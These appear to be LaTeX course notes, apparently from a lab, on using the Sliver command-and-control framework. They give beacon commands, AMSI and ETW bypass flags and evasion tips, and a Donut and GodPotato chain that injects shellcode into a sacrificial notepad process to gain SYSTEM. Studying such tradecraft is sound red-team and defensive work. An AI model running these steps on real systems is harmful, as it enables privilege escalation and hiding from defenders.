\section{Commands and Tools}

\subsection{Basic Commands}

Common options:
\begin{itemize}
    \item \verb+-t <sec>+: timeout
    \item \verb+--in-process+
    \item \verb+--amsi-bypass+
    \item \verb+--etw-bypass+
    \item \verb+--save+: save ouput to disk
\end{itemize}

\begin{itemize}
    \item \verb+shell+: start an interactive shell
    \item \verb+getsystem+: create a new beacon with \verb+NT AUTHORITY\SYSTEM+
    \item \verb+make-token+: create a token based on credentials
    \item  \verb+impersonate+: Impersonate a logged in user
\end{itemize}

\subsubsection{File transfert}
for \verb+download+ and \verb+upload+ commands, when specifying a Windows directory, we need to escape the backslash character.
\begin{verbatim}
upload pwn.exe C:\\temp\\pwn.exe
\end{verbatim}

\subsubsection{execute}
Execute a program on the remote system.  Note that we must be cautious running the execute command as it will open a command prompt or the tool's GUI.

\begin{verbatim}
execute -o certutil.exe
# echo -en "whoami" | iconv -t UTF-16LE | base64 -w 0
execute -o powershell -e dwBoAG8AYQBtAGkA
\end{verbatim}


\subsubsection{execute-assembly}
\verb+execute-assembly+ allows us to run .NET binaries on the target machine, without uploading them. However, one caveat that \verb+execute-assembly+ has is it will spawn a child process.

\begin{verbatim}
execute-assembly <flags> <local_path_to_file> <params>
\end{verbatim}


By default \verb+execute-assembly+ will spawn a \verb+notepad.exe+ process when we run any .NET binary.  This can be changed using the \verb+--process+ and specifying the process.




We must exercise most caution when executing tools within the Sliver session as defenders can easily look into the processes and deem it malicious. Because of the parent-child processses relationship or by looking into the .Net assemblies

The key takeaways that we get from those basic examples are:
\begin{itemize}
    \item Exercise extreme caution as notepad.exe or any other process that we specify will appear as a managed process whereas it might need to be unmanaged. One example is the http-session.exe as there is no reason to start notepad.exe.
    \item Hardcoded strings such as Seatbelt that can be easily found in the process' memory.
    \item Certain API calls can appear as unusual for the process that you are injecting into.
\end{itemize}


\subsubsection{execute-assembly in-process}

Avoid to create a child process and allow access to bypasses (AMSI, ETW)

\begin{verbatim}
execute-assembly --in-process --amsi-bypass --etw-bypass <local_path_to_file> <params>
\end{verbatim}
    

\subsection{Aliases and Extensions (Armory)}

Sliver allows an operator to extend the local client console and its features by adding new commands based on third party tools. The easiest way to install an alias or extension is using the \href{https://sliver.sh/docs?name=Armory}{armory}. The armory is the Sliver Alias and Extension package manager (introduced in Sliver v1.5), it allows you to automatically install various 3rd party tools such as BOFs and .NET tooling.

\href{https://sliver.sh/docs?name=Aliases+and+Extensions}{Aliases and extensions} are installed on the "sliver client"-side, and thus are not shared among operators

difference between an alias and an extension:
\begin{itemize}
    \item An alias is essentially just a thin wrapper around the existing sideload and execute-assembly commands, and aliases cannot have dependencies.
    \item An extension is a shared library that is reflectively loaded into the Sliver implant process, and is passed several callbacks to return data to the implant. As such these extensions must implement the Sliver API
\end{itemize}


Arguments passed to .NET assemblies and non-reflective PE extensions are limited to 256 characters. This is due to a limitation in the Donut loader Sliver is using. A workaround for .NET assemblies is to execute them in-process, using the \verb+--in-process+ flag, or a custom BOF extension like \verb+inline-execute-assembly+. There is currently no workaround for non-reflective PE extension.

\subsubsection{Armory Mgt}
\begin{verbatim}
armory
armory install <soft>
armory update

# list aliases
aliases
# remove aliases
aliases rm 
# load aliases
aliases load
# install aliases
aliases install


# list extensions
extensions
# remove extensions
extensions rm 
# load extensions
extensions load
# install extensions
extensions install
\end{verbatim}

\subsubsection{Execution}

\begin{verbatim}
<name> -- <params>
\end{verbatim}

\subsubsection{Alias}

A Sliver alias is nothing more than a folder inside \verb+(~/.sliver-client/extensions/+ or ~/.sliver-client/aliases/+) with the following structure:
\begin{itemize}
    \item an \verb+alias.json+ file
    \item alias binaries in one of the following formats: .NET assemblies or shared libraries (\verb+.so+, \verb+.dll+, \verb+.dylib+)
\end{itemize}

To load an alias in Sliver, use the \verb+alias load+ command:
\begin{verbatim}
alias load /home/lesnuages/tools/misc/sliver-extensions/GhostPack/Rubeus
\end{verbatim}

Writing Aliases 

\subsection{Donut}
\href{https://github.com/TheWover/donut}{Donut} is a tool focused on creating binary shellcodes that can be executed in memory; Donut will generate a shellcode of a .NET binary, which can be executed via the \verb+execute-shellcode+ argument in Sliver.

To take advantage of Donut, we would need to create either an http or mtls beacon(s) beforehand.

To generate the binary shellcode using Donut, we are going to be using the arguments \verb+-a 2+ responsible for choosing the architecture (\verb+2 = amd64+), the \verb+-b 2+ responsible for bypassing AMSI/WLDP/ETW (\verb+2 = Abort on fail+), \verb+-p+ followed by the arguments that are going to be run from GodPotato and the \verb+-o+ to specify the output directory and the name of the shellcode.

\begin{verbatim}
git clone https://github.com/TheWover/donut
cd donut/
make -f Makefile
./donut 


./donut -i ./GodPotato-NET4.exe -a 2 -b 2 -p '-cmd c:\temp\http-beacon.exe' -o ./godpotato.bin
\end{verbatim}

To continue and use the execute-shellcode in memory, we would have to create a sacrificial process of \verb+notepad.exe+ using \verb+Rubeus.exe+ (previously downloaded from SharpCollection). Creating a sacrificial process will enable us to not intervene with other processes that might be crucial to the organization as they might crash.

\begin{verbatim}
execute-assembly /home/htb-ac590/Rubeus.exe createnetonly /program:C:\\windows\\system32\\notepad.exe
execute-shellcode -p 5668 /home/htb-ac590/godpotato.bin
\end{verbatim}
